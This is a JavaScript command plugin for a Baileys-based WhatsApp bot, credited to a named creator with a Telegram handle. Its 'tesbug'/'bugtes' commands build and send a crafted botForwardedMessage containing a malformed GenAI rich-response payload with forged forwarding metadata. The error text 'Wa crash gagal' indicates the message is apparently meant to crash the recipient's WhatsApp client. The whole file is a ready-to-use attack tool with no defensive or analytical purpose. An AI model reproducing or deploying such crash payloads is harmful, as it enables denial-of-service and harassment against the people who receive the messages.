//﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌//
//    </>  𝐂𝐫𝐞𝐝𝐢𝐭𝐬  </>      //
//   𝐂𝐫𝐞𝐚𝐭𝐨𝐫: 𝐀𝐥𝐩𝐮𝐭𝐫𝐚𝐚       //
//   𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦: @𝐬𝐢𝐚𝐩𝐚𝐚𝐤𝐮𝟖𝟕𝟖     //
//﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌//

import { prepareWAMessageMedia } from '@itsliaaa/baileys';
import { AIRich } from '../../Library/MessageBuilder.js';
const handler = async (m, { conn }) => {
    try {
        await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
        const media = await prepareWAMessageMedia(
            { image: { url: "https://cdn.ornzora.eu.cc/f4ec8425-c846-4937-b838-9291bf0514e2-FIORA.jpg" } },
            { upload: conn.waUploadToServer }
        );
        const waImageUrl = Object.values(media)[0]?.url;
        const rawPayload = {
            messageContextInfo: {
                messageSecret: "v/3VN8Gfr2dbKzgt1GKDEU7ovyYW+nswh4Duwq6KDuU="
            },
            botForwardedMessage: {
                message: {
                    richResponseMessage: {
                        messageType: 1,
                        unifiedResponse: {
                            data: Buffer.from(JSON.stringify({
                                "response_id": "742a451a-0c33-45ca-a205-42c2b1666bca",
                                "sections": [
                                    {
                                        "view_model": {
                                            "primitive": {
                                                "__typename": "GenAIImagePrimitive",
                                                "preview_image": {
                                                    "__typename": "GenAIMediaItem",
                                                    "mime_type": "image/jpeg",
                                                    "url": waImageUrl
                                                },
                                                "full_image": {
                                                    "__typename": "GenAIMediaItem",
                                                    "mime_type": "image/jpeg",
                                                    "url": waImageUrl
                                                }
                                            },
                                            "__typename": "GenAISingleLayoutViewModel"
                                        }
                                    }
                                ]
                            })).toString('base64')
                        },
                        contextInfo: {
                            forwardingScore: 1,
                            isForwarded: true,
                            forwardOrigin: 4
                        }
                    }
                }
            }
        };
        const rich = new AIRich(conn);
        rich.loadFrom(rawPayload); 
        await rich.send(m.chat, { quoted: m });
        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (err) {
        console.error('[GENAI IMAGE ERROR]', err);
        await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } }).catch(() => { });
        await m.reply('Wa crash gagal.');
    }
};
handler.help = ['tesbug', 'bug'];
handler.tags = ['owner'];
handler.command = /^(tesbug|bugtes)$/i; 
handler.limit = true;
export default handler;
